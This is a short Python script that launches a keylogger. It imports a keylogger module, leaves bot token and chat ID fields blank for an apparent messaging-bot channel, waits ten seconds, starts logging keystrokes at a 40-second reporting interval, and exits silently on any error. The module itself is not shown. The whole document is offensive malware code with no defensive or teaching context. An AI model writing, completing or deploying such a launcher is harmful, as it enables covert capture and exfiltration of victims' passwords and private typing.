#!/usr/bin/python
import keylogger, time, sys

bot_token = ""
chat_id = ""
interval_time = 40

time.sleep(10)

try:
	my_keylogger = keylogger.Keylogger(interval_time, bot_token, chat_id)
	my_keylogger.start()
except Exception:
	sys.exit()
